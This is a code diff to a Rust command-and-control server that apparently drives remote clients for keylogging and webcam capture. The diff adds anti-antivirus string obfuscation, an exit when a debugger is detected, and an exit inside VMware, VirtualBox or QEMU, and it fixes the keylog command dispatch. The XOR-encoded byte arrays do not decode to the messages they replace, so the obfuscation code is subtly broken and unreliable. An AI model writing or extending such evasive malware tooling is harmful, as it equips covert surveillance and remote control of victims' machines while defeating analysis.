@@ -11,8 +11,6 @@ use aes_gcm::aead::{Aead, KeyInit};
 use rand::Rng;use std::io::Write;
 use std::fs;
 // Encrypted strings for anti-AV
-const LISTENING_MSG: &str = "C2 Server listening on port 7878";
-const CLIENT_CONNECTED_MSG: &str = "Client {} connected";
 
 const ENCRYPTION_KEY: [u8; 32] = [
     0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
@@ -20,6 +18,33 @@ const ENCRYPTION_KEY: [u8; 32] = [
     0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
     0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
 ];
+
+const XOR_KEY: u8 = 0xAA;
+
+const LISTENING_MSG_ENCRYPTED: [u8; 32] = [233,152,138,225,207,192,196,207,192,138,182,179,189,190,207,184,179,184,177,138,187,184,138,186,187,192,190,138,113,114,113,114];
+const CLIENT_CONNECTED_MSG_ENCRYPTED: [u8; 19] = [233,182,179,207,184,190,138,155,157,138,175,187,184,184,207,175,190,207,204];
+const CLIENT_DISCONNECTED_ENCRYPTED: [u8; 22] = [233,182,179,207,184,190,138,155,157,138,204,179,189,175,187,184,184,207,175,190,207,204];
+
+fn decrypt_string(encrypted: &[u8]) -> String {
+    encrypted.iter().map(|&b| (b ^ XOR_KEY) as char).collect()
+}
+
+fn is_vm() -> bool {
+    #[cfg(windows)]
+    {
+        use winreg::RegKey;
+        use winreg::enums::HKEY_LOCAL_MACHINE;
+        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
+        if let Ok(key) = hklm.open_subkey("HARDWARE\\DESCRIPTION\\System") {
+        if let Ok(bios) = key.get_value::<String, _>("SystemBiosVersion") {
+                if bios.contains("VMware") || bios.contains("VirtualBox") || bios.contains("QEMU") {
+                    return true;
+                }
+            }
+        }
+    }
+    false
+}
 
 fn encrypt(data: &[u8]) -> Vec<u8> {
     let key = Key::<Aes256Gcm>::from_slice(&ENCRYPTION_KEY);
@@ -114,12 +139,22 @@ async fn handle_client(mut client: Client, mut rx: mpsc::Receiver<Command>) {
             }
         }
     }
-    println!("Client {} disconnected", client.id);
+    println!("{}", decrypt_string(&CLIENT_DISCONNECTED_ENCRYPTED).replace("{}", &client.id.to_string()));
 }
 
 #[tokio::main]
 async fn main() {
-    println!("{}", LISTENING_MSG);
+    #[cfg(windows)]
+    {
+        use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
+        if unsafe { IsDebuggerPresent() }.as_bool() {
+            std::process::exit(0);
+        }
+    }
+    if is_vm() {
+        std::process::exit(0);
+    }
+    println!("{}", decrypt_string(&LISTENING_MSG_ENCRYPTED));
     let listener = TcpListener::bind("0.0.0.0:7878").await.unwrap();
     let clients: Arc<Mutex<HashMap<usize, mpsc::Sender<Command>>>> = Arc::new(Mutex::new(HashMap::new()));
     let clients_clone = clients.clone();
@@ -130,7 +165,7 @@ async fn main() {
     while let Ok((stream, _)) = listener.accept().await {
         let id = client_id;
         client_id += 1;
-        println!("{}", CLIENT_CONNECTED_MSG.replace("{}", &id.to_string()));
+        println!("{}", decrypt_string(&CLIENT_CONNECTED_MSG_ENCRYPTED).replace("{}", &id.to_string()));
         let (tx, rx) = mpsc::channel(100);
         clients.lock().await.insert(id, tx);
         let client = Client { id, stream };
@@ -187,7 +222,7 @@ async fn handle_user_input(clients: Arc<Mutex<HashMap<usize, mpsc::Sender<Comman
                 if parts.len() < 2 { println!("Usage: keylog <client_id>"); continue; }
                 if let Ok(id) = parts[1].parse::<usize>() {
                     if let Some(tx) = clients.lock().await.get(&id) {
-                        let _ = tx.send(Command::Webcam).await;
+                        let _ = tx.send(Command::Keylog).await;
                         println!("Requested keylog from client {}", id);
                     } else {
                         println!("Client {} not found", id);
